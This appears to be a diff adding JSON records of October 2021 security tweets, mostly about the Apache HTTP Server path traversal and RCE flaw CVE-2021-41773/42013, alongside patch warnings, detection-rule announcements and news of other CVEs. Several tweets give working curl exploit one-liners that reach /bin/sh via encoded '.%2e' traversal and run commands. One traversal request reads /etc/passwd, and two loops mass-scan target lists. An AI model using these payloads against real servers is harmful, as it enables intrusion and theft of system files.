+    "tweetfavorites": 1086,
+    "tweetquotes": 22,
+    "tweetreplies": 5,
+    "tweetretweets": 472,
+    "tweettext": "RCE exploit both for Apache 2.4.49 (CVE-2021-41773) and 2.4.50 (CVE-2021-42013):\nroot@CT406:~# curl 'http://192.168.0.191/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo Content-Type: text/plain; echo; id'\nuid=1(daemon) gid=1(daemon) groups=1(daemon)",
+    "tweettime": "2021-10-07, 23:13:08",
+    "tweeturl": "https://twitter.com/roman_soft/status/1446252280597078024",
+    "username": "roman_soft"
+}
+{
+    "tweetfavorites": 39,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 19,
+    "tweettext": "\"It was found that the fix for CVE-2021-41773 in Apache HTTP Server 2.4.50 was insufficient. An attacker could use a path traversal attack to map URLs to files outside the directories configured by Alias-like directives.\"",
+    "tweettime": "2021-10-07, 17:39:01",
+    "tweeturl": "https://twitter.com/bad_packets/status/1446168197296627717",
+    "username": "bad_packets"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2021/10/code-execution-bug-affects-yamale.html"
+    ],
+    "tweetfavorites": 88,
+    "tweetquotes": 3,
+    "tweetreplies": 1,
+    "tweetretweets": 90,
+    "tweettext": "A high-severity code injection #vulnerability (CVE-2021-38305) has been discovered in 23andMe's Yamale, a schema and validator for #YAML used by at least 224 repositories on #GitHub.\n\nRead: https://t.co/2S7HhGN0CN\n\n#infosec #cyberecurity #python",
+    "tweettime": "2021-10-07, 11:50:51",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1446080577514266625",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://pentesterlab.com/exercises/cve-2021-41773/course",
+        "https://pentesterlab.com/exercises/cve-2021-41773_ii/course"
+    ],
+    "tweetfavorites": 92,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 21,
+    "tweettext": "Two new challenges covering how to exploit the latest Apache Httpd RCE (CVE-2021-41773) via SSRF:\n\nFile disclosure:\nhttps://t.co/Tn3Ik3TRd7\n\nRCE (CGI enabled): \nhttps://t.co/VJBSTgX8Xi \n\nHave fun!",
+    "tweettime": "2021-10-06, 23:50:03",
+    "tweeturl": "https://twitter.com/PentesterLab/status/1445899182741458945",
+    "username": "PentesterLab"
+}
+{
+    "expanded_url": [
+        "https://github.com/Zeop-CyberSec/apache_normalize_path",
+        "https://github.com/rapid7/metasploit-framework/pull/15754"
+    ],
+    "tweetfavorites": 164,
+    "tweetquotes": 6,
+    "tweetreplies": 2,
+    "tweetretweets": 80,
+    "tweettext": "Just pushed my PoC to get an RCE using the CVE-2021-41773 (Path Traversal in Apache 2.4.49) into @metasploit. You like Meterpreter?\n\ncc @CERT_FR, @zeop_officiel, @Dinosn \n\nThe Github repo from Zeop Entreprise is now public: https://t.co/NkUOesiZnO.\n\nPull: https://t.co/pZ2aQWExLt https://t.co/5tdkZsQbJn",
+    "tweettime": "2021-10-06, 20:53:35",
+    "tweeturl": "https://twitter.com/Mekhalleh/status/1445854775279423491",
+    "username": "Mekhalleh"
+}
+{
+    "expanded_url": [
+        "https://ubuntu.com/security/CVE-2021-41773"
+    ],
+    "tweetfavorites": 31,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 11,
+    "tweettext": "Brutally trivial to exploit Apache CVE-2021-41773 RCE with mod-cgi is only a panic if you are running arch, manjaro, suze or a few others. The month old bug is too new to have rolled into Debian, ubuntu and most distros. https://t.co/W3C49Ckjxi",
+    "tweettime": "2021-10-06, 17:29:34",
+    "tweeturl": "https://twitter.com/dragosr/status/1445803430333730816",
+    "username": "dragosr"
+}
+{
+    "tweetfavorites": 333,
+    "tweetquotes": 2,
+    "tweetreplies": 9,
+    "tweetretweets": 104,
+    "tweettext": "Update : CVE-2021-41773 POC as RCE 🔥👇💥\n\n✅One Liner:\ncat file | while read host do ; do curl --silent --path-as-is --data \"echo;id\" '$host/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' | grep \"uid\" &amp;&amp; echo \"$host \\033[0;31mVuln\\n\"|| echo \"$host \\033[0;32mNot\\n\";done\n\n#infosec #bugbounty",
+    "tweettime": "2021-10-06, 08:24:53",
+    "tweeturl": "https://twitter.com/HackerGautam/status/1445666357920428036",
+    "username": "HackerGautam"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2021/10/multiple-critical-flaws-discovered-in.html"
+    ],
+    "tweetfavorites": 93,
+    "tweetquotes": 4,
+    "tweetreplies": 0,
+    "tweetretweets": 58,
+    "tweettext": "Multiple critical vulnerabilities have been discovered in #Honeywell Experion PKS and ACE Controllers that could be exploited for RCE and DoS attacks on critical processes.\n\nhttps://t.co/3Phji231fH\n\nCVE-2021-38397 (CVSS 10)\nTypeCVE-2021-38395 (CVSS 9.1)\nCVE-2021-38399 (CVSS 7.5)",
+    "tweettime": "2021-10-06, 07:36:50",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1445654263971995653",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://www.greynoise.io/viz/query/?gnql=cve%3ACVE-2021-41773"
+    ],
+    "tweetfavorites": 102,
+    "tweetquotes": 4,
+    "tweetreplies": 2,
+    "tweetretweets": 27,
+    "tweettext": "GreyNoise is observing vuln-checking and exploitation of Apache CVE-2021-41773 at internet-scale from several hosts. Increase in attempts is likely. Tags available to all users and customers now. \n\ntags:\"Apache HTTP Server Path Traversal Attempt\"\n\nhttps://t.co/qIQU2MQ26p https://t.co/xqj8hkbzEf",
+    "tweettime": "2021-10-06, 01:44:45",
+    "tweeturl": "https://twitter.com/GreyNoiseIO/status/1445565658758991875",
+    "username": "GreyNoiseIO"
+}
+{
+    "tweetfavorites": 1215,
+    "tweetquotes": 50,
+    "tweetreplies": 15,
+    "tweetretweets": 548,
+    "tweettext": "Here's how to run full commands with arguments via CVE-2021-41773 via a path traversal vulnerability in the event mod-cgi is enabled on Apache 2.4.49\n\ncurl --data \"A=|id&gt;&gt;/tmp/x;uname\\$IFS-a&gt;&gt;/tmp/x\" 'http://127.0.0.1:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' -vv\n\nPatch urgently. https://t.co/jaL6jpR42w",
+    "tweettime": "2021-10-05, 23:30:19",
+    "tweeturl": "https://twitter.com/hackerfantastic/status/1445531829985968137",
+    "username": "hackerfantastic"
+}
+{
+    "tweetfavorites": 561,
+    "tweetquotes": 23,
+    "tweetreplies": 17,
+    "tweetretweets": 220,
+    "tweettext": "Oh good, CVE-2021-41773 is in fact also RCE providing mod-cgi is enabled. An attacker can call any binary on the system and supply environment variables (that's how CGI works!) - if they can upload a file and set +x permissions, they can trivially run commands as Apache user. https://t.co/c3D2h5Cy4A",
+    "tweettime": "2021-10-05, 22:57:19",
+    "tweeturl": "https://twitter.com/hackerfantastic/status/1445523524555186189",
+    "username": "hackerfantastic"
+}
+{
+    "expanded_url": [
+        "https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2021-41773"
+    ],
+    "tweetfavorites": 253,
+    "tweetquotes": 3,
+    "tweetreplies": 2,
+    "tweetretweets": 93,
+    "tweettext": "Path traversal and file disclosure vulnerability in Apache HTTP Server 2.4.49\n\nAll-in-One reproduction for CVE-2021-41773\nhttps://t.co/xeC7X4xeX1\n\n#Vulhub #infosec #security #bugbountytip https://t.co/DhD8BFin4o",
+    "tweettime": "2021-10-05, 17:06:14",
+    "tweeturl": "https://twitter.com/phithon_xg/status/1445435172787146754",
+    "username": "phithon_xg"
+}
+{
+    "expanded_url": [
+        "https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-41773.yaml",
+        "https://github.com/projectdiscovery/nuclei-templates/blob/master/technologies/aviatrix-detect.yaml",
+        "https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-40870.yaml"
+    ],
+    "tweetfavorites": 35,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 17,
+    "tweettext": "For those who are into mass hunting and automation!\n\n👉 Apache 2.4.49 - Path Traversal\nCVE-2021-41773 POC \n\nhttps://t.co/GyHG4TK9lf\n\n👉 Aviatrix Controller 6.x before 6.5-1804.1922. RCE\nCVE-2021-40870 POC\n\nhttps://t.co/d8hrai6QtP\n\nhttps://t.co/h5h9CuzdTx\n\n#bugbountytips #infosec",
+    "tweettime": "2021-10-05, 16:23:11",
+    "tweeturl": "https://twitter.com/cyph3r_asr/status/1445424339709358088",
+    "username": "cyph3r_asr"
+}
+{
+    "expanded_url": [
+        "https://github.com/snowyyowl/writeups/blob/main/CVE-2021-26084.md"
+    ],
+    "tweetfavorites": 278,
+    "tweetquotes": 2,
+    "tweetreplies": 3,
+    "tweetretweets": 99,
+    "tweettext": "Finally my disclosure request has been approved and here's a write-up of CVE-2021-26084, Confluence RCE. Though not much to add than what's already known of the CVE and it's exploits, i'm simply outlining my approach that led to this CVE .\n\nhttps://t.co/as1qLqNqMD",
+    "tweettime": "2021-10-05, 16:07:58",
+    "tweeturl": "https://twitter.com/bennyyjacob/status/1445420510590824451",
+    "username": "bennyyjacob"
+}
+{
+    "expanded_url": [
+        "https://httpd.apache.org/security/vulnerabilities_24.html"
+    ],
+    "tweetfavorites": 201,
+    "tweetquotes": 1,
+    "tweetreplies": 3,
+    "tweetretweets": 70,
+    "tweettext": "CVE-2021-41773: A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. An attacker could use a path traversal attack ...\nhttps://t.co/bhoEa1YUcC\n\nPoC\n127.0.0.1/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+    "tweettime": "2021-10-05, 15:57:55",
+    "tweeturl": "https://twitter.com/cyber_advising/status/1445417980305854468",
+    "username": "cyber_advising"
+}
+{
+    "expanded_url": [
+        "https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-41773.yaml",
+        "https://github.com/SigmaHQ/sigma/pull/2124/files"
+    ],
+    "tweetfavorites": 142,
+    "tweetquotes": 1,
+    "tweetreplies": 4,
+    "tweetretweets": 65,
+    "tweettext": "I've converted @daffainfo nuclei template into a #Sigma rule to detect exploitation of the #Apache path traversal vulnerability reported in CVE-2021-41773\n\n#CVE202141773\n\nNuclei Template\nhttps://t.co/nFdTlnXCSS\n\nSigma Rule\nhttps://t.co/LvdcroscA1 https://t.co/JcKJqyit6w",
+    "tweettime": "2021-10-05, 15:40:58",
+    "tweeturl": "https://twitter.com/cyb3rops/status/1445413712702152706",
+    "username": "cyb3rops"
+}
+{
+    "tweetfavorites": 1037,
+    "tweetquotes": 16,
+    "tweetreplies": 12,
+    "tweetretweets": 421,
+    "tweettext": "CVE-2021-41773 POC 🔥👇\n \n✅ One Liner :\n\ncat targets.txt | while read host do ; do curl --silent --path-as-is --insecure \"$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd\" | grep \"root:*\" &amp;&amp; echo \"$host \\033[0;31mVulnerable\\n\" || echo \"$host \\033[0;32mNot Vulnerable\\n\";done",
+    "tweettime": "2021-10-05, 15:34:35",
+    "tweeturl": "https://twitter.com/HackerGautam/status/1445412108863041544",
+    "username": "HackerGautam"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2021/10/apache-warns-of-zero-day-exploit-in.html"
+    ],
+    "tweetfavorites": 160,
+    "tweetquotes": 7,
+    "tweetreplies": 5,
+    "tweetretweets": 127,
+    "tweettext": "Apache has issued urgent security patches to address 2 new security vulnerabilities—including a zero-day path traversal and file disclosure flaw (CVE-2021-41773) in HTTP servers that it said is being actively exploited in the wild.\n\nDetails: https://t.co/B3wC46pZol\n\n#infosec #",
+    "tweettime": "2021-10-05, 15:09:41",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1445405839041437699",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://therecord.media/apache-fixes-actively-exploited-web-server-zero-day/"
+    ],
+    "tweetfavorites": 53,
+    "tweetquotes": 3,
+    "tweetreplies": 2,
+    "tweetretweets": 34,
+    "tweettext": "NEW: Apache fixes actively exploited web server zero-day\n\n-Tracked as CVE-2021-41773\n-Issue resides in Apache's path normalization logic\n-Several PoCs already released\n-No details on the ongoing exploitation\n\nhttps://t.co/JV9nKlgXLl https://t.co/JB0WLNvZf9",
+    "tweettime": "2021-10-05, 14:52:54",
+    "tweeturl": "https://twitter.com/campuscodi/status/1445401617407295495",
+    "username": "campuscodi"
+}
+{
+    "expanded_url": [
+        "https://httpd.apache.org/security/vulnerabilities_24.html"
+    ],
+    "tweetfavorites": 775,
+    "tweetquotes": 47,
+    "tweetreplies": 16,
+    "tweetretweets": 399,
+    "tweettext": "🔥 We have reproduced the fresh CVE-2021-41773 Path Traversal vulnerability in Apache 2.4.49.\n\nIf files outside of the document root are not protected by \"require all denied\" these requests can succeed.\n\nPatch ASAP! \n\nhttps://t.co/6JrbayDbqG https://t.co/AnsaJszPTE",
+    "tweettime": "2021-10-05, 13:11:25",
+    "tweeturl": "https://twitter.com/ptswarm/status/1445376079548624899",
+    "username": "ptswarm"
+}
+{
+    "expanded_url": [
+        "https://httpd.apache.org/security/vulnerabilities_24.html"
+    ],
+    "tweetfavorites": 129,
+    "tweetquotes": 8,
+    "tweetreplies": 8,
+    "tweetretweets": 87,
+    "tweettext": "If you use Apache HTTP Server 2.4.49 (only that version), you should update to 2.4.50 now due to CVE-2021-41773, a nasty 0-day path traversal vulnerability https://t.co/2QiV4h77B4",
+    "tweettime": "2021-10-05, 08:28:20",
+    "tweeturl": "https://twitter.com/iamamoose/status/1445304838963830784",
+    "username": "iamamoose"
+}
+{
+    "tweetfavorites": 54,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 28,
+    "tweettext": "Top 10 Most Used Vulns of the Month (Sep 1-30)\n#Analytics\n\nCVE-2021-40444 - Microsoft MSHTML RCE\n\nCVE-2021-26084 - Confluence Server Webwork OGNL Inj\n\nCVE-2021-22005 - vCenter Server contains - arbitrary file upload\n\n#CVE #bugbountytips #bugbounty #cybersecurity #infosec https://t.co/E7JWhFT4VD",
+    "tweettime": "2021-10-03, 02:20:09",
+    "tweeturl": "https://twitter.com/TodayCyberNews/status/1444487404182650881",
+    "username": "TodayCyberNews"
+}
+{
+    "tweetfavorites": 65,
+    "tweetquotes": 3,
+    "tweetreplies": 4,
+    "tweetretweets": 34,
+    "tweettext": "Mass scanning activity detected from the following hosts targeting Fortinet VPN servers vulnerable to unauthenticated arbitrary file read (CVE-2018-13379) leading to disclosure of usernames and passwords in plaintext.",
+    "tweettime": "2021-10-02, 21:02:06",
+    "tweeturl": "https://twitter.com/bad_packets/status/1444407365181132801",
+    "username": "bad_packets"
+}
